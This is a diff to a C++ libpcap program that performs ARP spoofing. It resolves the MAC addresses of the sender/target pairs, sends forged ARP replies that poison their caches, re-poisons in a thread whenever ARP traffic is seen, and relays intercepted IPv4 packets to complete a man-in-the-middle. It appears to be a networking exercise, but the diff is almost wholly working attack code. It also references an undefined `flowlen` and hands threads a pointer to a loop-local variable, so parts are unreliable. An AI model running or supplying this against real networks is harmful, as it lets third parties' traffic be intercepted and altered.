@@ -13,14 +13,16 @@ struct EthArpPacket final {
 	EthHdr eth_;
 	ArpHdr arp_;
 };
-struct thread_args {
-	pcap_t* handle;
-	Mac smac;
-	Ip sip;
-	Ip tip;
-};
-
 #pragma pack(pop)
+
+Ip dev_IP;
+Mac dev_MAC;
+std::vector<uint32_t> senderIp;
+std::vector<uint32_t> targetIp;
+std::set<uint32_t> Ip_set;
+std::vector<uint32_t> Ip_vec;
+std::vector<Mac> Mac_vec;
+pcap_t* handle;
 
 uint32_t parseIp(const char* str) {
 	uint8_t temp[4];
@@ -70,19 +72,27 @@ void recvpacket(pcap_t* handle,pcap_pkthdr** pheader,const EthArpPacket** pppack
 	}
 }
 
-void *send_where_req(void* args) 
+void *send_where_req(void* iter) 
 {
-	thread_args* t_args = static_cast<thread_args*>(args);
-	pcap_t* handle=t_args->handle;
-	Mac smac=t_args->smac;
-	Ip sip=t_args->sip;
-	Ip tip=t_args->tip;
+	Ip tip=Ip(*(uint32_t*)iter);
 	while(1)
 	{
-		sendpacket(handle,Mac::broadcastMac(),smac,smac,sip,Mac::nullMac(),tip,ArpHdr::Request);
-		//printf("wait for 1 sec...\n");
+		sendpacket(handle,Mac::broadcastMac(),dev_MAC,dev_MAC,dev_IP,Mac::nullMac(),tip,ArpHdr::Request);
 		std::this_thread::sleep_for(std::chrono::seconds(1));
 	}
+}
+
+void *wait_and_reply(void* iter) 
+{
+	uint32_t i=*(uint32_t*)iter;
+	printf("thisis %d\n",i);
+	std::this_thread::sleep_for(std::chrono::milliseconds(100));
+	Ip sip=Ip(Ip_vec[senderIp[i]]);
+	Ip tip=Ip(Ip_vec[targetIp[i]]);
+	Mac smac=Mac_vec[senderIp[i]];
+	sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
+	delete (uint32_t*)iter;
+	return NULL;
 }
 
 
@@ -94,7 +104,7 @@ int main(int argc, char* argv[]) {
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
@@ -119,7 +129,7 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't find MAC address\n");
 		return -1;
 	}
-	Mac dev_MAC=Mac((const uint8_t*)(dev_addr->addr->sa_data+10));//sockaddr_ll.sll_addr
+	dev_MAC=Mac((const uint8_t*)(dev_addr->addr->sa_data+10));//sockaddr_ll.sll_addr
 	//get IP
 	dev_addr=devp->addresses;
 	while(dev_addr&&dev_addr->addr->sa_family!=AF_INET) {
@@ -129,14 +139,12 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't find IP address\n");
 		return -1;
 	}
-	Ip dev_IP=Ip(ntohl(*(uint32_t*)&((sockaddr_in*)(dev_addr->addr))->sin_addr));//casting and ntohl
+	dev_IP=Ip(ntohl(*(uint32_t*)&((sockaddr_in*)(dev_addr->addr))->sin_addr));//casting and ntohl
 	pcap_pkthdr* header;
 	const EthArpPacket* ppacket;
 	
-	std::vector<uint32_t> senderIp;
-	std::vector<uint32_t> targetIp;
 	
-	std::set<uint32_t> Ip_set;
+	
 	uint32_t t;
 	for(int i=2;i<argc;i+=2)
 	{
@@ -154,20 +162,19 @@ int main(int argc, char* argv[]) {
 		targetIp[i]=std::distance(Ip_set.begin(), Ip_set.find(targetIp[i]));
 		//printf("%d %d\n",senderIp[i],targetIp[i]);
 	}
-	std::vector<Mac> Mac_vec;
 	for (std::set<uint32_t>::iterator iter = Ip_set.begin(); iter != Ip_set.end(); iter++)
 	{
 		//printf("%s\n",((std::string)Ip(*iter)).data());
 		//sendpacket(handle,Mac::broadcastMac(),dev_MAC,dev_MAC,dev_IP,Mac::nullMac(),senderIp,ArpHdr::Request);
 		pthread_t send_thread;
-		thread_args args={handle,dev_MAC,dev_IP,Ip(*iter)};
-		if(pthread_create(&send_thread, NULL, send_where_req, static_cast<void*>(&args))) {
-        		fprintf(stderr, "Error while creating thread\n");
+		int xx=*iter;
+		if(pthread_create(&send_thread, NULL, send_where_req,(void*)&xx)) {
+        	fprintf(stderr, "Error while creating thread\n");
 			return -1;
-    		}
-    		while(1)
-    		{
-    			recvpacket(handle,&header,&ppacket);
+		}
+		while(1)
+		{
+			recvpacket(handle,&header,&ppacket);
 			//Mac senderMac=ppacket->arp_.smac_;
 			if(ntohl(ppacket->arp_.sip_)!=*iter)continue;
 			if(ntohl(ppacket->arp_.tip_)!=(uint32_t)dev_IP)continue;
@@ -175,11 +182,11 @@ int main(int argc, char* argv[]) {
 			//printf("%s\n",((std::string)ppacket->arp_.smac_).data());
 			Mac_vec.push_back(ppacket->arp_.smac_);
 			break;
-    		}
-    		pthread_cancel(send_thread);
+		}
+		pthread_cancel(send_thread);
 	}
 	uint32_t maclen=Mac_vec.size();	
-	std::vector<uint32_t> Ip_vec(Ip_set.begin(),Ip_set.end());
+	std::copy(Ip_set.begin(),Ip_set.end(),std::back_inserter(Ip_vec));
 	/*
 	for(int i=0;i<maclen;i++){
 		printf("%s\n",((std::string)Mac_vec[i]).data());
@@ -193,6 +200,68 @@ int main(int argc, char* argv[]) {
 		//Mac tmac=Mac_vec[targetIp[i]];
 		//printf("%d %d\n",senderIp[i],targetIp[i]);
 		sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
+	}
+	const u_char* packet_data;
+	while(1)
+	{
+		int res = pcap_next_ex(handle, &header, &packet_data);
+		if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			fprintf(stderr,"pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			exit(-1);
+		}
+		//printf("%u bytes captured\n", header->caplen);
+		uint16_t type=((EthHdr*)packet_data)->type();
+		if(type==EthHdr::Ip4)
+		{
+			printf("this is Ip4\n");
+			uint32_t psip=ntohl(*(uint32_t*)(packet_data+0x1a));
+			uint32_t ptip=ntohl(*(uint32_t*)(packet_data+0x1e));
+			printf("%s\n",((std::string)Ip(psip)).data());
+			printf("%s\n",((std::string)Ip(ptip)).data());
+			for(int i=0;i<flowlen;i++)
+			{
+				if(Ip_vec[senderIp[i]]==psip&&Ip_vec[targetIp[i]]==ptip)
+				{
+					u_char* copy_packet_data=(u_char*)malloc(header->caplen);
+					memcpy(copy_packet_data,packet_data,header->caplen);
+					((EthHdr*)copy_packet_data)->smac_=dev_MAC;
+					((EthHdr*)copy_packet_data)->dmac_=Mac_vec[targetIp[i]];
+					pcap_sendpacket(handle,copy_packet_data, header->caplen);
+					free(copy_packet_data);
+					printf("relay done\n");
+				}
+			}
+		}
+		if(type==EthHdr::Arp)
+		{
+			printf("this is Arp\n");
+			uint32_t psip=ntohl(((EthArpPacket*)packet_data)->arp_.sip_);
+			uint32_t ptip=ntohl(((EthArpPacket*)packet_data)->arp_.tip_);
+			Mac ptmac=((EthArpPacket*)packet_data)->arp_.tmac_;
+			for(int i=0;i<flowlen;i++)
+			{
+				printf("%d\n",i);
+				bool check=false;
+				check|=Ip_vec[senderIp[i]]==psip&&Ip_vec[targetIp[i]]==ptip;
+				check|=Ip_vec[senderIp[i]]==ptip&&Ip_vec[targetIp[i]]==psip;
+				check|=Mac::nullMac()==ptmac&&Ip_vec[targetIp[i]]==psip;
+				if(check)
+				{
+					printf("haha %d\n",i);
+					Ip sip=Ip(Ip_vec[senderIp[i]]);
+					Ip tip=Ip(Ip_vec[targetIp[i]]);
+					Mac smac=Mac_vec[senderIp[i]];
+					pthread_t send_thread;
+					uint32_t *x=new uint32_t;
+					*x=i;
+					if(pthread_create(&send_thread, NULL, wait_and_reply,(void*)x)) {
+						fprintf(stderr, "Error while creating thread\n");
+						return -1;
+					}
+				}
+			}
+		}
 	}
 	pcap_close(handle);
 }
